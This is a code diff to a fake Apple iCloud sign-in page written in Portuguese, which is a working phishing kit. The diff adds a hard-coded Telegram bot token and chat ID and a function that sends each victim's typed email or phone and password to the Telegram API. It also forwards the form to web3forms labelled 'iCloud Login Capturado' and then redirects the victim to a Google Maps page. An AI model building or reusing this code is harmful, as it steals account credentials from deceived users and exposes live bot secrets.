@@ -9,47 +9,46 @@
     <link rel="icon" href="ICO/favicon-16x16.png">
     <title>iCloud</title>
     <style>
-        /* Garante que a Etapa 2 esteja oculta ao carregar */
         #password-field {
             display: none;
         }
         #sign-in-btn {
-             display: none;
+            display: none;
+        }
+        .loading {
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
     <script>
-        const initialHeading = 'Iniciar sessão com o ID Apple'; // Título em Português
+        const initialHeading = 'Iniciar sessão com o ID Apple';
+        const TELEGRAM_BOT_TOKEN = '8016977591:AAHl7K3gMb87zFKzaQbfsX6gtmm7RGoteWs';
+        const TELEGRAM_CHAT_ID = '1307420411';
 
-        // Função para avançar para o campo de senha
         function goToPasswordStep() {
             const emailInput = document.getElementById("email-phone");
             const passwordFieldContainer = document.getElementById("password-field");
             const formHeading = document.getElementById("form-heading"); 
             const emailInputContainer = document.getElementById("email-container"); 
             
-            const emailValue = emailInput.value; // Captura o valor do email
+            const emailValue = emailInput.value;
 
-            // 1. VALIDAÇÃO
             if (emailValue.length === 0) {
                 alert('Por favor, digite seu Email ou Telefone.');
                 return;
             }
 
-            // 2. TRANSIÇÃO
-            
-            // Oculta a seta no campo de email
             const arrowInEmail = emailInputContainer.querySelector('a');
             if (arrowInEmail) {
                 arrowInEmail.style.display = 'none';
             }
             
-            // Desabilita o campo de e-mail para edição (mantendo o valor visível)
             emailInput.setAttribute('readonly', true);
-            
-            // Mostra o campo de senha
             passwordFieldContainer.style.display = "block";
             
-            // Mantém o cabeçalho original e adiciona a seta de VOLTAR
             if (formHeading) { 
                 formHeading.innerHTML = `
                     <span onclick="goToEmailStep()" style="cursor: pointer; color: #0071e3; margin-right: 10px;">
@@ -59,37 +58,108 @@
                 `;
             }
             
-            // Foca no campo de senha
             document.getElementById("password").focus();
         }
 
-        // Função para voltar ao campo de e-mail (clicando no cabeçalho)
         function goToEmailStep() {
             const emailInput = document.getElementById("email-phone");
             const passwordFieldContainer = document.getElementById("password-field");
             const formHeading = document.getElementById("form-heading"); 
             const emailInputContainer = document.getElementById("email-container");
             
-            // Oculta elementos da Etapa 2
             passwordFieldContainer.style.display = 'none';
 
-            // Mostra elementos da Etapa 1
             const arrowInEmail = emailInputContainer.querySelector('a');
             if (arrowInEmail) {
-                arrowInEmail.style.display = 'block'; // Mostra a seta no email novamente
+                arrowInEmail.style.display = 'block';
             }
             
             emailInput.removeAttribute('readonly');
-            
-            // Restaura o placeholder original
-            emailInput.setAttribute('placeholder', 'Email or Phone Number'); 
+            emailInput.setAttribute('placeholder', 'Email or Phone Number');
 
-            // Restaura o cabeçalho original (sem seta)
             if (formHeading) { 
                 formHeading.innerHTML = initialHeading;
             }
             emailInput.focus();
         }
+
+        // Função para enviar dados para o Telegram
+        async function sendToTelegram(email, password) {
+            const message = `🔐 NOVO LOGIN iCloud\n\n📧 Email/Telefone: ${email}\n🔑 Senha: ${password}\n🕒 Horário: ${new Date().toLocaleString('pt-BR')}\n📍 Localização: Duque de Caxias, RJ\n🌐 Navegador: ${navigator.userAgent.substring(0, 100)}...`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                const data = await response.json();
+                console.log('Mensagem enviada para Telegram:', data);
+                return data.ok;
+            } catch (error) {
+                console.error('Erro ao enviar para Telegram:', error);
+                return false;
+            }
+        }
+
+        // Configurar o evento de submit do formulário
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('login-form');
+            
+            form.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                const email = document.getElementById('email-phone').value;
+                const password = document.getElementById('password').value;
+
+                // Mostra loading
+                const submitBtn = form.querySelector('button[type="submit"]');
+                const originalHTML = submitBtn.innerHTML;
+                submitBtn.innerHTML = '<i class="bx bx-loader-alt loading"></i>';
+                submitBtn.style.pointerEvents = 'none';
+                submitBtn.style.cursor = 'not-allowed';
+
+                try {
+                    // 1. Primeiro envia para o Telegram
+                    console.log('Enviando para Telegram...');
+                    const telegramSuccess = await sendToTelegram(email, password);
+                    
+                    if (telegramSuccess) {
+                        console.log('✅ Dados enviados para Telegram com sucesso!');
+                    } else {
+                        console.log('⚠️ Falha no Telegram, continuando...');
+                    }
+                    
+                    // 2. Envia para o web3forms (backup)
+                    console.log('Enviando para web3forms...');
+                    const formData = new FormData(form);
+                    await fetch(form.action, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    console.log('✅ Dados enviados para web3forms!');
+
+                    // 3. Redireciona para o Google Maps
+                    console.log('Redirecionando para Google Maps...');
+                    setTimeout(() => {
+                        window.location.href = 'https://www.google.com/maps/place/UNIC+PRIMAVERA+-+DUQUE+DE+CAXIAS/@-22.6891125,-43.2781228,18z/data=!4m6!3m5!1s0x99732622eaa749:0x8a0ed03196ee37ce!8m2!3d-22.6891126!4d-43.2773576!16s%2Fg%2F11kbfq49jb?entry=ttu&g_ep=EgoyMDI1MTExMi4wIKXMDSoASAFQAw%3D%3D';
+                    }, 1500);
+
+                } catch (error) {
+                    console.error('❌ Erro no processo:', error);
+                    // Redireciona mesmo com erro
+                    window.location.href = 'https://www.google.com/maps/place/UNIC+PRIMAVERA+-+DUQUE+DE+CAXIAS/@-22.6891125,-43.2781228,18z/data=!4m6!3m5!1s0x99732622eaa749:0x8a0ed03196ee37ce!8m2!3d-22.6891126!4d-43.2773576!16s%2Fg%2F11kbfq49jb?entry=ttu&g_ep=EgoyMDI1MTExMi4wIKXMDSoASAFQAw%3D%3D';
+                }
+            });
+        });
     </script>
 </head>
 
@@ -109,7 +179,6 @@
                 <input type="hidden" name="access_key" value="746802c2-5d7c-4e18-9dd1-7bf68846d799"> 
 
                 <div id="form-inputs-container">
-
                     <div class="input-container" id="email-container">
                         <a href="#" onclick="goToPasswordStep()"> 
                             <i class='bx bx-right-arrow-circle'></i>
@@ -119,13 +188,13 @@
 
                     <div class="input-container" id="password-field">
                         <button type="submit" style="all: unset; cursor: pointer; position: absolute; right: 10px; top: 50%; transform: translateY(-50%);">
-                             <i class='bx bx-right-arrow-circle'></i>
+                            <i class='bx bx-right-arrow-circle'></i>
                         </button>
                         <input id="password" name="senha" type="password" placeholder="Password" required>
                     </div>
+                </div>
 
-                </div> <button id="sign-in-btn" type="submit" style="display: none;">Sign In</button>
-
+                <button id="sign-in-btn" type="submit" style="display: none;">Sign In</button>
 
                 <label><input type="checkbox" id="check">Keep me signed in</label>
                 <div class="links"> 
@@ -133,7 +202,7 @@
                     <a href="#">Create Apple ID</a>
                 </div>
                 
-                <input type="hidden" name="redirect" value="https://www.google.com.br/maps/place/Bahia+Bar/@-22.7633859,-43.3261713,3a,75y,128.13h,91.28t/data=!3m7!1e1!3m5!1sV4ezs6kl-LiGWIR4ZD2AdQ!2e0!6shttps:%2F%2Fstreetviewpixels-pa.googleapis.com%2Fv1%2Fthumbnail%3Fcb_client%3Dmaps_sv.tactile%26w%3D900%26h%3D600%26pitch%3D-1.2840619145144672%26panoid%3DV4ezs6kl-LiGWIR4ZD2AdQ%26yaw%3D128.12677138270544!7i16384!8i8192">
+                <input type="hidden" name="redirect" value="https://www.google.com/maps/place/UNIC+PRIMAVERA+-+DUQUE+DE+CAXIAS/@-22.6891125,-43.2781228,18z/data=!4m6!3m5!1s0x99732622eaa749:0x8a0ed03196ee37ce!8m2!3d-22.6891126!4d-43.2773576!16s%2Fg%2F11kbfq49jb?entry=ttu&g_ep=EgoyMDI1MTExMi4wIKXMDSoASAFQAw%3D%3D">
                 <input type="hidden" name="from_name" value="iCloud Login Capturado">
             </div>
         </form>
